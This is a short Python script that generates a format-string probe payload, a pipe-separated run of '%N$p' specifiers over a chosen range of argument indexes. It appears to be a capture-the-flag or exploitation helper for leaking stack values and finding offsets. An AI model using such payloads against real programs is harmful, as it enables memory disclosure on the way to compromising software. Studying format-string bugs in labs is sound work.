#!/usr/bin/env python3

import sys

try: start = int(sys.argv[1])
except: start = 1
try: max = int(sys.argv[2])
except: max = 4
try: full = sys.argv[3]
except: full = None

payload = ""
for i in range(start,start+max):
	base = "" if not full else f"{i}="
	payload += f"|{base}%{i}$p"

print(payload)
